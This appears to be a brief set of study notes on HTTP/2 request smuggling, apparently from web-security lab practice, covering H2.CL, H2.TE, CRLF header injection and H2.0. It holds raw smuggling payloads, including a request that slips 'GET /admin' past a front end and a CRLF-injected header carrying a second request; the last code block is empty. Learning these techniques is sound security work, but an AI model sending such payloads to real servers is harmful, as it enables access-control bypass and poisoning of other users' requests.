

#### H2.CL

```http
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
content-length	0
--------- data frame -------------
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```


### H2.TE

Similar to content-lenght include transfer-encoding chunked header


#### H2 CRLF header injection

Smuggling a complete request in the header (key/value based on how frontend server parses and downgraded to HTTP/1.1), which leads to request queue poisoning

(Don't add \r\n at the smuggled request the backend server adds behalf on you for the end of the header)
```
foo: bar\r\n
\r\n
GET /404 HTTP/1.1\r\n
Host: 0ab100ec040a2e948148d43b00340066.web-security-academy.net
```


- the CRLF Values can be injected in custom header key/values and in any of the http2 pseudo headers like path
  
  

### H2.0

similar to Cl.0, but the backend is taken by surprise getting a post request body on certain endpoints leads to polluting the connection pipeline.

```

```